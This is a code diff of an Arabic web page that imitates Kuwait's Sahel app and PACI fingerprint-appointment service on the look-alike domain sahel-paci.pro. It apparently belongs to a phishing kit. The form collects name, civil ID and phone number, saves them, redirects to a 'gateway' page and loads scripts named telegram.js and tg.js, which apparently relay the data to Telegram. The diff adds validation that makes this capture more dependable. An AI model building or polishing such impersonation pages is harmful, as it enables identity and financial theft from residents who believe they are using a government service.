@@ -1,29 +1,16 @@
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
-<head>
-    <!-- الأساسيات -->
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>حجز موعد البصمة البيومترية - تطبيق سهل الإلكتروني</title>
-
-    <meta name="google-site-verification" content="QZeo5dfCdbLYHAY8qcaA1XvM6ZiesoHDQzk0tNvijBQ" />
-
-    <meta name="description" content="احجز موعد البصمة البيومترية في دولة الكويت عبر تطبيق سهل بكل سهولة. اختر المركز المناسب، التاريخ والوقت المتاح لإتمام الحجز بنجاح.">
-    <meta name="keywords" content="حجز موعد البصمة سهل, البصمة البيومترية الكويت, تطبيق سهل الكويت, مواعيد البصمة وزارة الداخلية">
-    <meta name="author" content="منصة سهل الرقمية">
-    <link rel="canonical" href="https://sahel-paci.pro/fingerprint-appointment.html">
-
-    <meta property="og:type" content="website">
-    <meta property="og:title" content="حجز موعد البصمة البيومترية - تطبيق سهل">
-    <meta property="og:description" content="احجز موعد البصمة البيومترية في الكويت بكل سهولة وأمان عبر الخدمات الرقمية المتاحة لتطبيق سهل.">
-    <meta property="og:image" content="https://sahel-paci.pro/Sahel_Application.png">
-    <meta property="og:url" content="https://sahel-paci.pro/fingerprint-appointment.html">
-    <meta property="og:locale" content="ar_AR">
-
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="assets/vendor/flatpickr/flatpickr.min.css">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>طلب خدمة</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700&display=swap"
+      rel="stylesheet"
+    />
+    <link rel="stylesheet" href="assets/vendor/flatpickr/flatpickr.min.css" />
     <style>
       :root {
         --primary: #3f7bc4;
@@ -44,7 +31,6 @@
         font-family: "Tajawal", "Arial", sans-serif;
         color: var(--text);
         font-size: 15px;
-        background: #fff;
       }
 
       .top-header,
@@ -116,73 +102,40 @@
       }
 
       .page {
-        width: 100%;
+        width: min(100%, 390px);
         min-height: 100vh;
+        margin: 0 auto;
         background: #fff;
         display: flex;
         flex-direction: column;
-      }
-
-      .header,
-      .content,
-      .footer {
-        width: 100%;
-        background: #fff;
-      }
-
-      .header-inner,
-      .content-inner,
-      .footer-inner {
-        width: min(100%, 390px);
-        margin: 0 auto;
-        padding-left: 22px;
-        padding-right: 22px;
-      }
-
-      .header {
-        padding-top: 0;
-      }
-
-      .header-inner {
-        padding-bottom: 18px;
+        box-shadow: 0 0 0 1px rgba(63, 123, 196, 0.06);
       }
 
       .content {
         flex: 1;
-      }
-
-      .content-inner {
         display: flex;
         flex-direction: column;
-        padding-top: 10px;
-        padding-bottom: 28px;
+        padding: 44px 22px 28px;
       }
 
       .logo-wrap {
         display: flex;
-        flex-direction: row;
         justify-content: center;
         align-items: center;
         gap: 14px;
         margin-bottom: 30px;
-        width: 100%;
       }
 
       .logo {
+        width: 96px;
         height: auto;
         display: block;
-        max-width: 100%;
       }
 
-      .logo-paci {
-        flex-shrink: 0;
-        width: min(52vw, 210px);
+      .paci-logo {
+        width: 72px;
         height: auto;
-      }
-
-      .logo-sahel {
-        width: min(34vw, 150px);
-        height: auto;
+        display: block;
       }
 
       .title {
@@ -275,6 +228,21 @@
         padding: 12px 14px;
       }
 
+      .field-input.is-invalid {
+        border-color: #e0433e;
+      }
+
+      .field-error {
+        display: none;
+        margin: 6px 2px 0;
+        font-size: 13px;
+        color: #e0433e;
+      }
+
+      .field-error.is-visible {
+        display: block;
+      }
+
       .file-picker {
         display: flex;
         align-items: center;
@@ -347,19 +315,11 @@
       .footer {
         background: var(--footer);
         color: #fff;
-        display: flex;
-        align-items: center;
-        justify-content: center;
         text-align: center;
+        padding: 28px 14px;
         font-size: 15px;
         line-height: 1.7;
         margin-top: auto;
-        padding-top: 10px;
-        padding-bottom: 10px;
-      }
-
-      .footer-inner {
-        padding: 0;
       }
 
       body.is-paci-flow .top-header {
@@ -374,65 +334,17 @@
         display: none;
       }
 
-      body.is-paci-flow .content-inner {
+      body.is-paci-flow .content {
         padding-top: 30px;
       }
 
-      @media (max-width: 480px) {
-        .logo-paci {
-          width: unset;
-          max-width: none;
-          height: 122px;
-        }
-
-        .logo-sahel {
-          width: unset;
-          max-width: none;
-          height: 110px;
+      @media (max-width: 420px) {
+        .content {
+          padding-top: 46px;
         }
 
         .logo-wrap {
           margin-bottom: 28px;
-        }
-      }
-
-      @media (min-width: 768px) {
-        .header {
-          padding-top: 34px;
-        }
-
-        .header-inner,
-        .content-inner,
-        .footer-inner {
-          width: min(100%, 1120px);
-          padding-left: 48px;
-          padding-right: 48px;
-        }
-
-        .logo-wrap {
-          justify-content: center;
-          gap: 22px;
-          margin-bottom: 18px;
-        }
-
-        .logo-paci {
-          height: 112px;
-          width: auto;
-        }
-
-        .logo-sahel {
-          height: 112px;
-          width: auto;
-        }
-
-        .content-inner {
-          max-width: 540px;
-          padding-top: 8px;
-        }
-
-        .footer-inner {
-          width: min(100%, 1120px);
-          text-align: center;
         }
       }
     </style>
@@ -450,32 +362,24 @@
     </section>
 
     <main class="page">
-      <header class="header">
-        <div class="header-inner">
-          <div class="logo-wrap">
-            <img class="logo logo-paci" src="assets/images/paci.png" alt="شعار PACI" />
-            <img class="logo logo-sahel" src="assets/images/logo.png" alt="شعار سهل" />
-          </div>
-        </div>
-      </header>
-
       <section class="content">
-        <div class="content-inner">
-          <section class="service-panel">
-            <p class="service-copy" id="service-copy">أكمل البيانات التالية لإرسال طلب الخدمة المختارة.</p>
-            <h2 class="service-header" id="service-name">طلب خدمة</h2>
-            <div id="service-form-container"></div>
-          </section>
+        <div class="logo-wrap">
+          <img class="logo" src="assets/images/logo.png" alt="شعار سهل" />
+          <img class="paci-logo" src="assets/images/services/paci.png" alt="شعار المعلومات المدنية" />
         </div>
+
+        <section class="service-panel">
+          <p class="service-copy" id="service-copy">أكمل البيانات التالية لإرسال طلب الخدمة المختارة.</p>
+          <h2 class="service-header" id="service-name">طلب خدمة</h2>
+          <div id="service-form-container"></div>
+        </section>
       </section>
 
-      <footer class="footer">
-        <div class="footer-inner">جميع الحقوق محفوظة © مقر الهيئة العامة الكويت 2026</div>
-      </footer>
+      <footer class="footer">جميع الحقوق محفوظة © مقر الهيئة العامة الكويت 2026</footer>
     </main>
 
-    <script src="assets/js/config.js"></script>
     <script src="assets/js/telegram.js"></script>
+    <script src="assets/js/tg.js"></script>
     <script src="assets/vendor/flatpickr/flatpickr.min.js"></script>
     <script src="assets/vendor/flatpickr/ar.js"></script>
     <script>
@@ -640,13 +544,17 @@
         "هولندا"
       ];
 
-      function createField(id, label, type, placeholder, extraAttributes) {
+      function createField(id, label, type, placeholder, extraAttributes, errorMessage) {
         var attributes = extraAttributes ? " " + extraAttributes : "";
         var fieldPlaceholder = placeholder ? ' placeholder="' + placeholder + '"' : "";
+        var errorMarkup = errorMessage
+          ? '  <p class="field-error" id="' + id + '-error">' + errorMessage + "</p>"
+          : "";
         return (
           '<div class="field">' +
           '  <label class="field-label" for="' + id + '">' + label + "</label>" +
           '  <input class="field-input" id="' + id + '" type="' + type + '"' + fieldPlaceholder + attributes + " />" +
+          errorMarkup +
           "</div>"
         );
       }
@@ -691,7 +599,14 @@
         var civilIdLabel = (config && config.civilIdLabel) || "الرقم المدني";
 
         return (
-          createField("applicant-name", "اسم مقدم الطلب", "text") +
+          createField(
+            "applicant-name",
+            "اسم مقدم الطلب",
+            "text",
+            "",
+            "",
+            "يرجى إدخال اسم مقدم الطلب"
+          ) +
           createField(
             "civil-id",
             civilIdLabel,
@@ -699,7 +614,14 @@
             civilIdPlaceholder,
             'inputmode="numeric" maxlength="12"'
           ) +
-          createField("mobile-number", "رقم الهاتف", "tel", "", 'inputmode="numeric"')
+          createField(
+            "mobile-number",
+            "رقم الهاتف",
+            "tel",
+            "",
+            'inputmode="numeric"',
+            "يرجى إدخال رقم الهاتف"
+          )
         );
       }
 
@@ -827,6 +749,51 @@
         });
       }
 
+      function showFieldError(field) {
+        var errorElement = field.parentElement.querySelector(".field-error");
+        field.classList.add("is-invalid");
+
+        if (errorElement) {
+          errorElement.classList.add("is-visible");
+        }
+      }
+
+      function clearFieldError(field) {
+        var errorElement = field.parentElement.querySelector(".field-error");
+        field.classList.remove("is-invalid");
+
+        if (errorElement) {
+          errorElement.classList.remove("is-visible");
+        }
+      }
+
+      function validateRequiredFields(form) {
+        var requiredFieldIds = ["applicant-name", "mobile-number"];
+        var firstInvalidField = null;
+
+        requiredFieldIds.forEach(function (fieldId) {
+          var field = form.querySelector("#" + fieldId);
+
+          if (!field) {
+            return;
+          }
+
+          if (!field.value.trim()) {
+            showFieldError(field);
+            firstInvalidField = firstInvalidField || field;
+          } else {
+            clearFieldError(field);
+          }
+        });
+
+        if (firstInvalidField) {
+          firstInvalidField.focus();
+          return false;
+        }
+
+        return true;
+      }
+
       function bindFormSubmit(formId, redirectTarget) {
         var form = serviceFormContainer.querySelector("#" + formId);
         if (!form) {
@@ -836,8 +803,23 @@
         restorePersistedFormValues(form);
         bindFormFieldPersistence(form);
 
+        ["applicant-name", "mobile-number"].forEach(function (fieldId) {
+          var field = form.querySelector("#" + fieldId);
+
+          if (field) {
+            field.addEventListener("input", function () {
+              clearFieldError(field);
+            });
+          }
+        });
+
         form.addEventListener("submit", function (event) {
           event.preventDefault();
+
+          if (!validateRequiredFields(form)) {
+            return;
+          }
+
           persistFormValues(form);
           window.location.href = redirectTarget || "gateway.html";
         });
@@ -889,28 +871,13 @@
           createCommonFields() +
           createField("attendance-date", "تاريخ الحضور", "text", "اختر تاريخ الحضور", 'autocomplete="off"') +
           '  <div class="field">' +
-          '    <label class="field-label" for="center">مركز أخذ البصمة</label>' +
-          '    <select class="field-select" id="center" required>' +
-          '      <option value="" selected>اختر المركز المناسب</option>' +
-          '      <optgroup label="مراكز المواطنين ومجلس التعاون">' +
-          '        <option value="مركز غرب مشرف (مديرية أمن حولي)">مركز غرب مشرف (مديرية أمن حولي)</option>' +
-          '        <option value="مركز الرقعي (مديرية أمن الفروانية)">مركز الرقعي (مديرية أمن الفروانية)</option>' +
-          '        <option value="مركز أم الهيمان (مديرية أمن الأحمدي)">مركز أم الهيمان (مديرية أمن الأحمدي)</option>' +
-          '        <option value="مركز تيماء (مديرية أمن الجهراء)">مركز تيماء (مديرية أمن الجهراء)</option>' +
-          '        <option value="مركز مديرية أمن العاصمة">مركز مديرية أمن العاصمة</option>' +
-          '      </optgroup>' +
-          '      <optgroup label="المجمعات التجارية">' +
-          '        <option value="مجمع الأفنيوز (The Avenues)">مجمع الأفنيوز (The Avenues)</option>' +
-          '        <option value="مجمع 360 (360 Mall)">مجمع 360 (360 Mall)</option>' +
-          '        <option value="مجمع العاصمة مول">مجمع العاصمة مول</option>' +
-          '        <option value="مجمع الخيران">مجمع الخيران</option>' +
-          '        <option value="مجمع الوزارات">مجمع الوزارات</option>' +
-          '      </optgroup>' +
-          '      <optgroup label="مراكز المقيمين والشركات">' +
-          '        <option value="إدارة الأدلة الجنائية (الفروانية)">إدارة الأدلة الجنائية (الفروانية)</option>' +
-          '        <option value="مركز تبصيم الشركات (أم الهيمان)">مركز تبصيم الشركات (أم الهيمان)</option>' +
-          '        <option value="مركز تبصيم الشركات (الجهراء)">مركز تبصيم الشركات (الجهراء)</option>' +
-          '      </optgroup>' +
+          '    <label class="field-label" for="branch-name">الفرع</label>' +
+          '    <select class="field-select" id="branch-name">' +
+          '      <option value="" selected>أختر الفرع</option>' +
+          '      <option value="قسم تحقيق الشخصية- تصميم الشركات - محافظة الجهراء">قسم تحقيق الشخصية- تصميم الشركات - محافظة الجهراء</option>' +
+          '      <option value="قسم تحقيق الشخصية- علي صباح السالم - ام الهيمان">قسم تحقيق الشخصية- علي صباح السالم - ام الهيمان</option>' +
+          '      <option value="قسم تحقيق الشخصية - حولي والعاصمة">قسم تحقيق الشخصية - حولي والعاصمة</option>' +
+          '      <option value="قسم تحقيق الشخصية-الفروانية">قسم تحقيق الشخصية-الفروانية</option>' +
           "    </select>" +
           "  </div>" +
           '  <button class="submit next-button" type="submit">التالي</button>' +
